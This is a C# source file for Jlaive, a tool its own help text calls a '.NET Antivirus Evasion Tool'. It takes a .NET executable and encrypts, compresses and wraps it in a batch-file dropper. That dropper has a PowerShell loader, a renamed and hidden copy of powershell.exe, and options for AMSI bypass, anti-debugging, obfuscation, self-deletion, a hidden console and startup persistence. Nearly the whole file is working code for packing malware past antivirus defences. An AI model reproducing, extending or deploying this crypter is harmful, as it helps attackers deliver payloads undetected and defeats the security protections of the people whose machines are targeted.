﻿using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.CSharp;

using static Jlaive.Utils;

namespace Jlaive
{
    internal class Program
    {
        static string _output = string.Empty;
        static string _input = string.Empty;
        static bool _amsibypass = false;
        static bool _antidebug = false;
        static bool _obfuscate = false;
        static bool _deleteself = false;
        static bool _hidden = false;
        static bool _startup = false;

        static void Main(string[] args)
        {
            if (args.Length < 1) HelpManual();
            else if (args[0] == "help" || args[0] == "--help" || args[0] == "-h") HelpManual();

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "-o" || args[i] == "--output") _output = args[i + 1];
                else if (args[i] == "-i" || args[i] == "--input") _input = args[i + 1];
                else if (args[i] == "-ab" || args[i] == "--amsibypass") _amsibypass = true;
                else if (args[i] == "-ad" || args[i] == "--antidebug") _antidebug = true;
                else if (args[i] == "-obf" || args[i] == "--obfuscate") _obfuscate = true;
                else if (args[i] == "-d" || args[i] == "--deleteself") _deleteself = true;
                else if (args[i] == "-h" || args[i] == "--hidden") _hidden = true;
                else if (args[i] == "-s" || args[i] == "--startup") _startup = true;
            }

            if (!File.Exists(_input))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid input path.");
                Console.ResetColor();
                Environment.Exit(1);
            }
            if (!IsAssembly(_input))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Input file not valid assembly!");
                Console.ResetColor();
                Environment.Exit(1);
            }

            Random rng = new Random();
            Console.ForegroundColor = ConsoleColor.Gray;
            byte[] pbytes = File.ReadAllBytes(_input);

            Console.WriteLine("Creating .NET stub...");
            AesManaged aes = new AesManaged();
            string stub = StubGen.CreateCS(aes.Key, aes.IV, _amsibypass, _antidebug, _startup, rng);
            string tempfile = Path.GetTempFileName();
            Console.WriteLine("Compiling stub...");
            File.WriteAllText("payload.txt", Convert.ToBase64String(Encrypt(Compress(pbytes), aes.Key, aes.IV)));
            aes.Dispose();
            CSharpCodeProvider csc = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.dll" }, tempfile)
            {
                GenerateExecutable = true,
                CompilerOptions = "/optimize",
                IncludeDebugInformation = false
            };
            parameters.EmbeddedResources.Add("payload.txt");
            CompilerResults results = csc.CompileAssemblyFromSource(parameters, stub);
            if (results.Errors.Count > 0)
            {
                List<string> errors = new List<string>();
                foreach (CompilerError error in results.Errors) errors.Add(error.ToString());
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Stub build errors:{Environment.NewLine}{string.Join(Environment.NewLine, errors)}");
                Console.ResetColor();
                Environment.Exit(1);
                return;
            }
            byte[] stubbytes = File.ReadAllBytes(tempfile);
            File.Delete("payload.txt");
            File.Delete(tempfile);

            Console.WriteLine("Encrypting stub...");
            aes = new AesManaged();
            byte[] encrypted = Encrypt(Compress(stubbytes), aes.Key, aes.IV);

            Console.WriteLine("Creating PowerShell command...");
            string command = StubGen.CreatePS(aes.Key, aes.IV, _hidden, rng);
            aes.Dispose();

            Console.WriteLine("Constructing batch file...");
            StringBuilder toobf = new StringBuilder();
            toobf.AppendLine("rem https://github.com/ch2sh/Jlaive");
            toobf.AppendLine(command);
            StringBuilder output = new StringBuilder();
            output.AppendLine("@echo off");
            output.AppendLine(@"echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ""%~dp0%~nx0.exe"" /y");
            output.AppendLine("attrib +s +h \"%~dp0%~nx0.exe\"");
            output.AppendLine("cls");
            output.AppendLine("cd %~dp0");
            if (_obfuscate) output.Append(Obfuscator.GenCode(toobf.ToString(), rng, 1));
            else output.AppendLine(toobf.ToString());
            output.AppendLine("attrib -s -h \"%~dp0%~nx0.exe\"");
            output.Append("del \"%~dp0%~nx0.exe\"");
            if (_deleteself) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
            output.AppendLine("exit /b");
            output.Append(Convert.ToBase64String(encrypted));

            Console.WriteLine("Writing output...");
            _output = Path.ChangeExtension(_output, "bat");
            File.WriteAllText(_output, output.ToString(), Encoding.ASCII);

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"Build successful!\nOutput path: {_output}");
            Console.ResetColor();
            Environment.Exit(0);
        }

        static void HelpManual()
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(@".________ .___    .______  .___ .___     ._______
:____.   \|   |   :      \ : __||   |___ : .____/
 __|  :/ ||   |   |   .   || : ||   |   || : _/\ 
|     :  ||   |/\ |   :   ||   ||   :   ||   /  \
 \__. __/ |   /  \|___|   ||   | \      ||_.: __/
    :/    |______/    |___||___|  \____/    :/   
    :                                            ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(".NET Antivirus Evasion Tool");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("GitHub: https://github.com/ch2sh/Jlaive");
            Console.WriteLine("Discord: https://discord.gg/RU5RjSe8WN");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Usage:");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.Write($" {Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName)} [-h|--help] [-i|--input] [-o|--output] [-ab|--amsibypass] [-ad|--antidebug] [-obf|--obfuscate] [-d|--deleteself] [-h|--hidden] [-s|--startup]\n\n");

            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("Arguments:");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("--help          Print help information");
            Console.WriteLine("--input         Set file input path");
            Console.WriteLine("--output        Set file output path");
            Console.WriteLine("--amsibypass    Bypass Assembly.Load AMSI check");
            Console.WriteLine("--antidebug     Add anti debug protection to output file.");
            Console.WriteLine("--obfuscate     Obfuscate output file");
            Console.WriteLine("--deleteself    Make output file delete itself after execution");
            Console.WriteLine("--hidden        Hide console during execution");
            Console.WriteLine("--startup       Add batch file to startup upon execution");
            Console.WriteLine();
            Console.ResetColor();
            Environment.Exit(0);
        }
    }
}
